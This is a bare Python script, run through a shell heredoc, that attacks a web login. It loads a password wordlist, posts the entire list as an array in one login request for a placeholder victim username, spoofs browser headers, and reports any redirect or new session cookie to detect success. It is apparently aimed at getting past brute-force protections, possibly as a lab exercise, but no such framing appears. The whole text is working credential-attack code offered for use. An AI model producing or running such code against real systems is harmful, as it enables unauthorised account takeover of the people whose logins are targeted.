python3 - <<'EOF'
import requests

base_url = "URL"

with open("C:/Users/malik/Downloads/passwords.txt") as f:
    passwords = [line.strip() for line in f]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": f"{base_url}/login",
    "Origin": base_url
}

r = requests.post(
    f"{base_url}/login",
    json={"username": "VICTIM_USERNAME", "password": passwords},
    cookies={"session": "SESSION_COOKIE"},
    headers=headers,
    allow_redirects=False
)

print(f"Status: {r.status_code}")
print(f"Location: {r.headers.get('Location', 'no redirect')}")
print(f"New cookie: {r.cookies.get('session', 'none')}")
EOF
